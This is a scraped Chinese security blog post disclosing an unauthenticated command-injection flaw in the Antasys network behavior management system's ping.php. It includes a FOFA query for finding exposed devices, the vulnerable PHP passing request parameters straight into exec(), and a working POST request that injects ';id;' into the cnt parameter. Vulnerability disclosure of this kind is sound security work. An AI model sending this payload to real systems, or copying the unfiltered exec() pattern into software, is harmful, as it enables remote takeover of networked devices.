---
title: "汉塔科技上网行为管理系统 ping.php 命令注入漏洞"
source: https://mrxn.net/jswz/antasys-dgn_tools-ping-rce.html
asset_dir: assets/汉塔科技上网行为管理系统-ping.php-命令注入漏洞
---

# 汉塔科技上网行为管理系统 ping.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/31 08:34
* 1214浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

恶意软件分析工具

文件大小转换

网络安全课程


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉塔科技 - 上网行为管理系统是上海汉塔网络科技有限公司开发的一款上网行为流量管理系统。其系统 `ping.php` 存在[命令注入](https://mrxn.net/tag/rce)漏洞，未授权攻击者可利用此漏洞在服务器上[执行](https://mrxn.net/tag/rce)任意系统命令，造成系统失陷、敏感数据泄露等高危风险。

网络监控与管理

# 影响版本

# fofa语法

> `body="Antasys"`

# 漏洞分析

> 系统比较古老，使用的是威盾PHP混淆加密，可以参考[这篇文章](https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html)附录部分代码进行批量解密或者使用参考链接部分进行在线单个文件解密。

直接看 `dgn/dgn_tools/ping.php` 的业务逻辑实现关键部分

```
<?php

$to_ping = $_REQUEST['ipdm'];
$count = $_REQUEST['cnt'];
$psize = $_REQUEST['ps'];
$loop = 1;
$output = "";
flush();
while ($loop--) {
    exec("ping -c $count -s $psize $to_ping", $list);
    if (count($list) == 0) $output .= "Bad option!";
    else {
        for ($i = 0; $i < count($list); $i++) {
            $output .= $list[$i] . "\r\n";
            $output .= "<br>";
            flush();
        }
    }
    flush();
    sleep(3);
}
echo $output;;
echo ' 
'; ?>
```

通过 `$_REQUEST` 超全局变量获取 `ipdm` 、`ps` 和 `cnt` 参数值后，就直接拼接进 exec 函数进行[命令执行](https://mrxn.net/tag/rce)，无任何过滤，造成命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /dgn/dgn_tools/ping.php HTTP/1.1
Host: antasys.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded

ipdm=127.1&cnt=1;id;%20%23%20&ps=10
```

深入探索

VPN服务

Windows安全工具

漏洞预警服务

三个个参数均存在命令注入

代码安全审计

## cnt

[![汉塔科技上网行为管理系统 ping.php 命令注入漏洞](images/img-001-e4580f3f9da1.webp)](https://image.mrxn.net/9c1624f44712451a8c7ca95515510294.webp)

## ps

[![汉塔科技上网行为管理系统 ping.php 命令注入漏洞](images/img-002-ca1fdd3a1a5e.webp)](https://image.mrxn.net/efbc80ce4700475ca23ca900fa3456c4.webp)

## ipdm

[![汉塔科技上网行为管理系统 ping.php 命令注入漏洞](images/img-003-d3022e1738d8.webp)](https://image.mrxn.net/f379983552654d07ab4a88eeb20dfed1.webp)

都是可以成功执行命令并回显结果。

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.cnt](#toc-5-1-)
* [5.2.ps](#toc-5-2-)
* [5.3.ipdm](#toc-5-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉塔科技上网行为管理系统 ping.php 命令注入漏洞](https://mrxn.net/jswz/antasys-dgn_tools-ping-rce.html)  
文章链接：<https://mrxn.net/jswz/antasys-dgn_tools-ping-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/antasys-dgn\_tools-ping-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/antasys-dgn\_tools-ping-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
